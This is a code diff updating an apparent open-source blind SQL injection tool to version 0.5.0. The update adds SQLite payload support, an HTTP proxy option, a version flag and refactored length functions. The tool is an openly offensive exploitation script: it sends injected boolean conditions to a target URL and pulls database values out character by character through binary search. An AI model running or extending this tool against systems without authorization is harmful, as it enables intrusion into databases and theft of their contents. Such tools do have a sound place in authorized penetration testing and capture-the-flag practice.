@@ -1,4 +1,4 @@
-#!/usr/bin/python3
+#!/usr/bin/env python3
 # Boolean-based Blind SQLi tool by TrebledJ.
 # Help: python bsqli.py -h
 # Docs: python bsqli.py --docs
@@ -21,6 +21,9 @@ from enum import Enum
 from dataclasses import dataclass, field
 import copy
 import random
+
+
+VERSION = '0.5.0'
 
 
 urllib3.disable_warnings()
@@ -109,7 +112,7 @@ class BooleanResultParser(ResultParser):
         return resp.status_code != '404'
 
 
-def make_session(max_retries: int) -> requests.Session:
+def make_session(max_retries: int, proxy: Optional[str]) -> requests.Session:
     s = requests.Session()
     # https://urllib3.readthedocs.io/en/stable/reference/urllib3.util.html#urllib3.util.Retry
     retries = Retry(
@@ -120,6 +123,11 @@ def make_session(max_retries: int) -> requests.Session:
     )
     s.mount('http://', requests.adapters.HTTPAdapter(max_retries=retries))
     s.mount('https://', requests.adapters.HTTPAdapter(max_retries=retries))
+    if proxy is not None:
+        s.proxies.update({
+            'http': proxy,
+            'https': proxy
+        })
     return s
 
 
@@ -184,6 +192,7 @@ class Sender:
 class DBMS(str, Enum):
     MySQL = "MySQL"
     SQLServer = "SQLServer"
+    SQLite = "SQLite"
     OracleSQL = "OracleSQL"
     def __str__(self):
         return self.value
@@ -192,7 +201,14 @@ class DBMS(str, Enum):
 class SQLVariant:
     version = '@@version'
     ascii = 'ASCII'
-    substring = 'SUBSTRING'
+    substring = 'SUBSTRING' # Basic function SUBSTRING(str, pos, len).
+    length = 'LENGTH'
+
+class SQLiteVariant(SQLVariant):
+    version = 'sqlite_version()'
+    current_user = "'no user'"
+    ascii = 'UNICODE'
+    
 
 class MySQLVariant(SQLVariant):
     current_user = 'current_user()'
@@ -205,6 +221,7 @@ class SQLServerVariant(SQLVariant):
     database_name = 'db_name()'
     server_name = '@@servername'
     host_name = 'host_name()'
+    length = 'LEN'
     
 class OracleSQLVariant(SQLVariant):
     version = '(select banner from v$version where rownum = 1)'
@@ -218,6 +235,7 @@ class OracleSQLVariant(SQLVariant):
 variant_class = {
     DBMS.MySQL: MySQLVariant,
     DBMS.SQLServer: SQLServerVariant,
+    DBMS.SQLite: SQLiteVariant,
     DBMS.OracleSQL: OracleSQLVariant,
 }
 
@@ -231,17 +249,17 @@ class SQLStringBrute:
 
     def get_by_bsearch(self, sql: str, min: int, max: int, *, index: Optional[int]=None, task=None):
         """
-        Search for the value of a query within a numeric range.
+        Search for the value of a query within a numeric range: [min, max).
         The query should return one integer.
         For strings, use ASCII(SUBSTRING(s, offset, 1)).
         """
         prev = None  # Previous guess.
 
-        if not self.sender.send(cond=f'{sql} < {max}'):
+        if not self.sender.send(cond=f'{sql}<{max}'):
             # Not even within range?
             return None
         
-        if not self.sender.send(cond=f'{sql} >= {min}'):
+        if not self.sender.send(cond=f'{sql}>={min}'):
             return None
 
         while min <= max:
@@ -269,14 +287,7 @@ class SQLStringBrute:
 
 
     def get_length(self, sql, max_len=2048, *, task=None):
-        match self.dbms:
-            case DBMS.MySQL:
-                sql = f"LENGTH(({sql}))"
-            case DBMS.SQLServer:
-                sql = f"LEN(({sql}))"
-            case DBMS.OracleSQL:
-                sql = f"LENGTH(({sql}))"
-
+        sql = f'{getattr(variant_class[self.dbms], "length")}(({sql}))'
         return self.get_by_bsearch(sql, 0, max_len, task=task)
 
 
@@ -335,7 +346,7 @@ class SQLStringBrute:
 
                     # Create threads and on-complete handlers.
                     for idx in range(length):
-                        f = executor.submit(self.get_by_bsearch, f"ASCII({SUBSTRING}(({sql}),{idx+1},1))", 0, 256, index=idx)
+                        f = executor.submit(self.get_by_bsearch, f"{ASCII}({SUBSTRING}(({sql}),{idx+1},1))", 0, 128, index=idx)
                         f.add_done_callback(lambda f: on_index_finished(task, idx))
                         future_map[f] = idx
 
@@ -397,7 +408,7 @@ class Query:
             if self.options.cast_to_string:
                 cast_len = self.options.cast_to_string_length
                 match self.brute.dbms:
-                    case DBMS.MySQL:
+                    case DBMS.MySQL | DBMS.SQLite:
                         res = self.brute.get_string(f'cast(({sql}) as char({cast_len}))')
                     case DBMS.SQLServer:
                         res = self.brute.get_string(f'cast(({sql}) as varchar({cast_len}))')
@@ -434,7 +445,7 @@ class Query:
         # is_notbased = (id_col.strip() == '')
 
         match self.brute.dbms:
-            case DBMS.MySQL:
+            case DBMS.MySQL | DBMS.SQLite:
                 sql = 'select {col} from {table}{where_clause} limit 1'
             case DBMS.SQLServer:
                 sql = 'select top 1 {col} from {table}{where_clause}'
@@ -670,6 +681,8 @@ def main():
 
     parser = argparse.ArgumentParser(description=f'Boolean-based Blind SQLi tool by TrebledJ.', formatter_class=Formatter)
     parser.add_argument('--docs', action='store_true', help='Extensive documentation on installation, usage, and examples.')
+    
+    parser.add_argument('-V', '--version', action='store_true', help='Print script version')
 
     parser.add_argument('-u', '--url', 
                         help='The url to scan, with the scheme (e.g. http://192.168.1.1/admin). Possibly containing an injection point marked with `{payload}`.')
@@ -681,11 +694,12 @@ def main():
     parser.add_argument('--timeout', default=5, type=int, help='Timeout of each request.')
     parser.add_argument('--payload', help='The SQLi payload.')
 
+    parser.add_argument('--proxy', default=None, help='Send requests to a proxy. Example: http://127.0.0.1:8080.')
     parser.add_argument('--follow-redirects', action='store_true', help='Follows redirects in responses.')
     parser.add_argument('--keep-alive', action='store_true', help='Enables `Connection: keep-alive`.')
     parser.add_argument('--max-retries', default=3, type=int, help='Maximum number of connection retries to attempt.')
 
-    parser.add_argument('--dbms', choices=[DBMS.MySQL, DBMS.SQLServer, DBMS.OracleSQL], help='The database management system.')
+    parser.add_argument('--dbms', choices=[DBMS.MySQL, DBMS.SQLServer, DBMS.SQLite, DBMS.OracleSQL], help='The database management system.')
     parser.add_argument('--strategy', choices=["B"], default='B',
                         help='The strategy to use: Boolean. You don\'t have any other choice at this moment.')
     parser.add_argument('-t', '--threads', default=8, type=int, help='Number of threads to use.')
@@ -727,6 +741,10 @@ def main():
     parser.add_argument('--cond-token', default=COND_TOKEN, help=argparse.SUPPRESS)
 
     args = parser.parse_args()
+
+    if args.version:
+        print(VERSION)
+        return
 
     if args.docs:
         print(docs)
@@ -771,7 +789,7 @@ def main():
         data=args.data,
         timeout=args.timeout,
         allow_redirects=args.follow_redirects,
-        session=make_session(args.max_retries),
+        session=make_session(args.max_retries, args.proxy),
         result_parser=parser,
     )
 
